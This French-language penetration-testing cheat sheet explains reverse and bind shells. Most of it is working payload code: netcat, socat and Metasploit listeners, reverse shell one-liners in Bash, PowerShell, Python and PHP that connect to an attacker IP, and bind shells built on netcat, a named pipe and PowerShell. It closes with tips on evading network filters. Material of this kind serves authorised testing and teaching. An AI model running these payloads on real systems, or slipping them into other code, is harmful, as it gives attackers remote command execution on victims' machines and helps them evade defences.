# Types de Shells

Cette section couvre les deux principaux types de shells utilisés en test d'intrusion: reverse shells et bind shells.

## Reverse Shells

Dans un reverse shell, la cible initie la connexion vers l'attaquant. Cela permet de contourner les pare-feu qui bloquent les connexions entrantes mais autorisent les connexions sortantes.
### Mise en place d'un listener
#### Netcat
```bash
# Sur l'attaquant
sudo nc -lvnp 443
```
#### Socat (pour une connexion plus stable)
```bash
# Sur l'attaquant
socat -d -d TCP-LISTEN:443 STDOUT
```
#### Metasploit
```bash
# Sur l'attaquant
msfconsole
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <IP_local>
set LPORT 443
run
```
### Exemples de payloads de reverse shell
#### Bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'
```
#### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```
#### PHP
```php
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## Bind Shells
Dans un bind shell, la cible ouvre un port et attend une connexion de l'attaquant. Cela est utile quand l'attaquant ne peut pas recevoir de connexions entrantes.
### Mise en place d'un shell sur la cible
#### Netcat
```bash
# Sur la cible
nc -lvnp 4444 -e /bin/bash
```
#### FIFO (named pipe) - pour les cas où nc sans -e est disponible
```bash
# Sur la cible
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
```
#### PowerShell
```powershell
# Sur la cible
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```
### Connexion au bind shell
```bash
# Sur l'attaquant
nc -nv <IP_CIBLE> 4444
```
## Choix du Type de Shell

| Scénario | Type recommandé |
|----------|-----------------|
| La cible est derrière un NAT/pare-feu | Reverse shell |
| L'attaquant est derrière un NAT/pare-feu | Bind shell |
| Environnement restrictif sortant | Bind shell sur ports autorisés (80, 443) |
| Environnement restrictif entrant | Reverse shell sur ports autorisés |
| Besoin de stabilité | Socat ou shells interactifs |
## Astuces & Bonnes Pratiques
- Utilisez des ports communs (80, 443, 53) pour contourner les filtres réseau
- Testez plusieurs méthodes si une échoue
- Préparez plusieurs payloads à l'avance
- Préférez HTTPS/TLS pour les communications chiffrées
- Considérez l'utilisation de techniques d'évitement (sleeps, exécution indirecte)